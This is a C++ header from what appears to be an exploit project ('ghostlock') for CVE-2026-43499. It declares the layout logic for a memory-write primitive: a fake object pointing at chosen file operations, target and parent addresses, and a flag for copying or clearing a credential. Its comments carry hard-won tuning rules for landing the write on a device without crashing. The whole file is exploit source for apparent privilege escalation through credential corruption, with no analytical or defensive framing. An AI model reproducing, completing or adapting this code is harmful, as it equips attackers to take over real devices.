#pragma once
/** @file memory/write_layout.hpp
 *  What a write is aimed at: the value it carries and the object it points to.
 *
 *  A write needs more than the three words of the arm: a value write carries the
 *  value in one field and the target in another, the fake object it lands on has
 *  to point at a set of file operations, and a credential write additionally asks
 *  for the credential to be copied rather than merely cleared. This is that
 *  decision, and it is a decision: the values it chooses between are the ones a
 *  caller supplies from the profile, never constants from here.
 *
 *  Two rules come with it, and both are hard-won: a write that preserves the
 *  child must carry a value and one that does not must carry none, and a zero
 *  write that preserves the child must land on a value whose second byte is odd,
 *  because the even case clears a state field and breaks every lookup that
 *  follows. Both are checked here rather than discovered on a device.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/memory/write_request.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    /** What the write is aimed at. */
    struct WriteLayout final {
        /** The word before the target: where a leaf write aims. */
        std::uintptr_t parent = 0U;
        /** The value a preserving write carries, or zero for a leaf. */
        std::uintptr_t value = 0U;
        /** The file operations the fake object points at. */
        std::uintptr_t fops = 0U;
        /** Whether the credential is copied rather than cleared. */
        bool needs_credential_copy = false;
    };

    /** The two values a caller chooses between, taken from the profile. */
    struct LayoutInputs final {
        /** The page-derived value a zero write carries when it preserves. */
        std::uintptr_t page_value = 0U;
        /** The credential alias a credential write carries when it preserves. */
        std::uintptr_t credential_value = 0U;
        /** The file operations of a cleared object and of a credential one. */
        std::uintptr_t default_fops = 0U;
        std::uintptr_t credential_fops = 0U;
        /** One pointer width, the distance from a target to its parent word. */
        std::size_t pointer_bytes = sizeof(std::uintptr_t);
    };

    /** Resolve the layout for one request. */
    [[nodiscard]] WriteLayout write_layout(const WriteRequest &request,

                                           const LayoutInputs &inputs) noexcept;

    /** True when the layout agrees with the request about carrying a value. */
    [[nodiscard]] bool layout_matches_request(const WriteRequest &request,

                                              const WriteLayout &layout) noexcept;

    /** True when the layout agrees with the request and, for a preserving zero
     *  write, the value it carries will not clear the state field it lands on. */
    [[nodiscard]] bool layout_accepts_page(const WriteRequest &request,

                                           const WriteLayout &layout) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
